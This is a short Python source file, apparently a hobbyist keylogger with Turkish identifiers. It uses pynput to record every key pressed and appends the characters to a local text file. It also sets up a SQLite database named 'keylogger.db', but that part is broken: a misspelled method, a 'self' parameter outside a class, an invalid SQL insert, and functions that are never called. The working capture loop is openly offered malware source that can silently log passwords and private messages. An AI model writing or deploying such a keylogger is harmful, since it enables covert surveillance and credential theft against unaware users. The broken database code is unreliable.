import pynput
import sqlite3
from pynput.keyboard import Key,Listener

count = 0
keys = []

baglan  = sqlite3.connect("keylogger.db")
command = baglan.cursor()



def on_press(key):
    global count,keys
    count += 1
    print("{0} pressed".format(key))
    keys.append(key)

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.text" , "a" , encoding="utf-8") as file:
        for key in keys:

            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)

def CreateDb(self):
        query = """CREATE TABLE hack
                 (log TEXT)"""
        self.cursor.exeute(query)
        self.connection.commit()
        self.cursor.close()

def ekle(log):
    command.execute("insert into virüs")
    baglan.commit()



def on_release(key):
    if key == Key.esc:
        print("exit")
        return False


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

baglan.close()